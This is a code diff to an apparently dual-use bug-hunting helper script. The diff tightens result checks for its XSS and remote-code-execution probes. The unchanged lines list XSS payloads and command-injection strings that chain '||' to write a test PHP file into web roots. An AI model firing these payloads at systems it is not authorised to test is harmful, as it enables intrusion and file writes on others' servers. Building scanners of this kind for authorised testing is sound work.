@@ -26,9 +26,9 @@ function JsBugHuntingHelper () {
 
   const previousXssAction = 'null'
   const payloadsXSS = [
-    { previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1" },
-    { previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1" },
-    { previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: "data.indexOf('<svg/onload=alert(\"XSS_VULNERABLE_PARAM\")>') !== -1" }
+    { previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
+    { previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
+    { previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: "data.indexOf('<svg/onload=alert(\"XSS_VULNERABLE_PARAM\")>') !== -1 && data.indexOf('Uncaught mysqli') === -1" }
   ]
 
   const previousErrorBasedSqliAction = 'null'
@@ -98,7 +98,7 @@ function JsBugHuntingHelper () {
   // payloadsSQLi.forEach((v) => console.log(v.payloadString))
 
   const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace('/testRCE.php','').replace(\"'TEST_RCE'\",'')"
-  const genericRceResult = "data.indexOf('TEST_RCE') !== -1"
+  const genericRceResult = "data.indexOf('TEST_RCE') !== -1 && data.indexOf('Uncaught mysqli') === -1"
   const payloadsRCE = [
     { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
     { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
